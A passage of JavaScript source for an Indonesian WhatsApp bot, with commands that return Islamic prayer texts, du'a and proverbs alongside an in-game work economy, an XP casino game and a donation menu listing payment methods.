      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    replyReinzID(`${contoh} + ${data}`)
}
break
//=========================================\\
case 'doaharian': {
    let src = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/doaharian.json', 'utf-8'))
    let caption = src.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    replyReinzID(`${caption}`)

}
break
//=========================================\\
case 'assalamualaikum': 
case 'assalamualaikum wr. wb.': 
case 'assalamualaikum wr wb': {
    let caption = `*Waalaikummussalam warahmatullahi wabarokatuh*


_📚 Baca yang dibawah ya!_
"Orang yang mengucapkan salam seperti ini maka ia mendapatkan 30 pahala, kemudian, orang yang dihadapan atau mendengarnya membalas dengan kalimat yang sama yaitu “Wa'alaikum salam warahmatullahi wabarakatuh” atau ditambah dengan yang lain (waridhwaana). Artinya selain daripada do'a selamat juga meminta pada Allah SWT"
`.trim()
    replyreinz(`${caption}`)
}
break
//=========================================\\
case 'niatsholat': {
    if (!q) return replyReinzID(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return replyReinzID(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    replyReinzID(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break
//=========================================\\
case 'quotesislami': {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    replyReinzID(`${arabic}\n${arti}`)
}
break
//=========================================\\
case 'doatahlil': {
    let { result } = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/tahlil.json', 'utf-8'))
    let caption = result.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    replyReinzID(`${caption}`)
}
break
//=========================================\\
case 'nebang': {
  if (!m.isGroup) return reply(mess.only.group)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds

    return hours + " jam " + minutes + " menit " + seconds + " detik"
}
	  let user = global.db.users[m.sender]
    let time = user.lastparming + 1800000
    if (new Date - user.lastparming < 1800000) return replyReinzID(`Anda sudah lelah untuk bekerja\nTunggu selama ${msToTime(time - new Date())} lagi`)
	let wood = `${Math.floor(Math.random() * 50)}`.trim()
	let money = `${Math.floor(Math.random() * 50000)}`.trim()
	user.wood += wood * 1
	user.money += money * 1
	user.lastparming = new Date * 1
    replyReinzID(`Selamat kamu mendapatkan : \n+${wood} Kayu\n+${money} Money`)
}
break
//=========================================\\
case 'casino': {
  if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
let buatall = 1
    RyuuBotz.casino = RyuuBotz.casino ? RyuuBotz.casino : {}
    if (m.chat in RyuuBotz.casino) return reply ('Masih ada yang melakukan casino disini, tunggu sampai selesai!!')
    else RyuuBotz.casino[m.chat] = true
    try {
        let randomaku = `${Math.floor(Math.random() * 101)}`.trim()
        let randomkamu = `${Math.floor(Math.random() * 81)}`.trim() //hehe Biar Susah Menang :v
        let Aku = (randomaku * 1)
        let Kamu = (randomkamu * 1)
        let count = args[0]
        count = count ? /all/i.test(count) ? Math.floor(global.db.users[m.sender].exp / buatall) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
        count = Math.max(1, count)
        if (args.length < 1) return reply('casino <jumlah>\n ' + 'casino 1000', )
        if (global.db.users[m.sender].exp >= count * 1) {
            global.db.users[m.sender].exp -= count * 1
            //await reply('') //Kwkwwkkwlwlw
            if (Aku > Kamu) {
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You LOSE*\nKamu kehilangan ${count} Uang(xp)`)
            } else if (Aku < Kamu) {
                global.db.users[m.sender].exp += count * 2
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You Win*\nKamu mendapatkan ${count * 2} Uang(xp)`)
            } else {
                global.db.users[m.sender].exp += count * 1
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*SERI*\nKamu mendapatkan ${count * 1} Uang(xp)`)
            }
        } else reply(`Uang(xp) kamu tidak mencukupi untuk Casino silahkan *#kerja* terlebih dahulu!`)
    } catch (e) {
        console.log(e)
        reply('Error!!')
        if (DevMode) {
            for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != RyuuBotz.user.jid)) {
                RyuuBotz.sendMessage(jid, 'casino.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
            }
        }
    } finally {
        delete RyuuBotz.casino[m.chat]
    }
}
break
//=========================================\\
case 'donate':
case 'pay':
case 'donasi':
case 'payment': {
  await RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
  const url = "https://telegra.ph/file/65469aa05e05c2543469c.jpg";

  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: RyuuBotz.waUploadToServer
    });
    return imageMessage;
  }

  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `Berikut daftar metode pembayaran saya ya~`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/payment/dana.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol DANA di bawah\n> DANA A/N: ${global.andana}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment DANA\",\"id\":\"123456789\",\"copy_code\":\"${global.nodana}\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/payment/gopay.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol GOPAY di bawah\n> GOPAY A/N: ${global.angopay}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment GOPAY\",\"id\":\"123456789\",\"copy_code\":\"${global.nogopay}\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/payment/qris.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> SCAN di atas / klik tombol` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_url",
                        "buttonParamsJson": `{\"display_text\":\"Payment QRIS\",\"url\":\https://tmpfiles.org/dl/18376782/1735084730914.jpg\",\"merchant_url\":\"https://www.google.com\"}`
                      },
                    ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: m }
  );

  await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break;

//=========================================\\
case 'kerja':
case 'bekerja': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let type = (args[0] || '').toLowerCase()
    let users = global.db.users[m.sender]
    let time = users.lastkerja + 30000
    let __timers = (new Date - users.lastkerja)
    let _timers = (1000 - __timers)
    let timers = clockString(_timers)

    let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]

    let daganga = ['wortel', 'sawi', 'selada', 'tomat', 'seledri', 'cabai', 'daging', 'ikan', 'ayam']
    let dagangan = daganga[Math.floor(Math.random() * daganga.length)]
    
    let pasie = ['sakit kepala', 'cedera', 'luka bakar', 'patah tulang']
    let pasien = pasie[Math.floor(Math.random() * pasie.length)]

    let pane = ['Wortel', 'Kubis', 'stowbery', 'teh', 'padi', 'jeruk', 'pisang', 'semangka', 'durian', 'rambutan']
    let panen = pane[Math.floor(Math.random() * pane.length)]

    let bengke = ['mobil', 'motor', 'becak', 'bajai', 'bus', 'angkot', 'becak', 'sepeda']
    let bengkel = bengke[Math.floor(Math.random() * bengke.length)]

    let ruma = ['Membangun Rumah', 'Membangun Gedung', 'Memperbaiki Rumah', 'Memperbaiki Gedung', 'Membangun Fasilitas Umum', 'Memperbaiki Fasilitas Umum']
    let rumah = ruma[Math.floor(Math.random() * ruma.length)]

    if (/kerja/i.test(command)) {
        switch (type) {
            case 'ojek':
if (new Date - users.lastkerja < 300000) return replyReinzID(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
let hasilojek = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilojek * 1
	              users.lastparming = new Date * 1
replyReinzID(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} ${global.rpg.emoticon('money')}*`)
break
            case 'pedagang':
if (new Date - users.lastkerja < 300000) return replyReinzID(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildagang = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildagang * 1
	              users.lastparming = new Date * 1
replyReinzID(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} ${global.rpg.emoticon('money')}*`)
break
            case 'dokter':
if (new Date - users.lastkerja < 300000) return replyReinzID(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildokter = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildokter * 1
	              users.lastparming = new Date * 1
replyReinzID(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* ${global.rpg.emoticon('money')}`)
break
            case 'petani':
if (new Date - users.lastkerja < 300000) return replyReinzID(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasiltani = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasiltani * 1
	              users.lastparming = new Date * 1
replyReinzID(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} ${global.rpg.emoticon('money')}*`)
break
            case 'montir':
if (new Date - users.lastkerja < 300000) return replyReinzID(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilmontir = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilmontir * 1
	              users.lastparming = new Date * 1
replyReinzID(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* ${global.rpg.emoticon('money')}`)
break
            case 'kuli':
if (new Date - users.lastkerja < 300000) return replyReinzID(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilkuli = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilkuli * 1
	              users.lastparming = new Date * 1
replyReinzID(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} ${global.rpg.emoticon('money')}*`)
break
            default:
return replykerja(`_*𝙋𝙄𝙇𝙄𝙃 𝙋𝙀𝙆𝙀𝙍𝙅𝘼𝘼𝙉 𝙔𝘼𝙉𝙂 𝙆𝘼𝙈𝙐 𝙄𝙉𝙂𝙄𝙉𝙆𝘼𝙉*_\n\n_➬ KULI_ \n_➬ MONTIR_ \n_➬ PETANI_ \n_➬ DOKTER_ \n_➬ PEDAGANG_ \n_➬ OJEK_ \n\n𝘾𝙊𝙉𝙏𝙊𝙃 𝙋𝙀𝙉𝙂𝙂𝙐𝙉𝘼𝘼𝙉 :\n.kerja dokter`)
        }
    }
}
break
//=========================================\\
  case 'bankcek': {
    if (!m.isGroup) return reply(mess.only.group)
    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0]: m.fromMe ? RyuuBotz.user.jid: m.sender
    if (!(who in global.db.users)) return reply(`User ${who} not in database`)
    let user = global.db.users[who]
    let isMods = global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
    let isRyuuTheCreator = m.fromMe || isMods || [RyuuBotz.decodeJid(RyuuBotz.user.id), ...global.owner.filter(([number, _, isRyuuTheCreator]) => number && !isRyuuTheCreator).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
    let isPrems =  isRyuuTheCreator || new Date() - user.premiumTime < 0
    let caption = `
▧「 *BANK CEK* 」
│ 👤 Name: ${user.registered ? user.name: RyuuBotz.getName(m.sender)}
│ ${global.rpg.emoticon('atm')} Atm: ${user.atm > 0 ? 'Level ' + user.atm: '✖️'}
│ ${global.rpg.emoticon('bank')} Bank: ${user.bank} / ${user.fullatm}
│ ${global.rpg.emoticon('money')} Money: ${user.money}
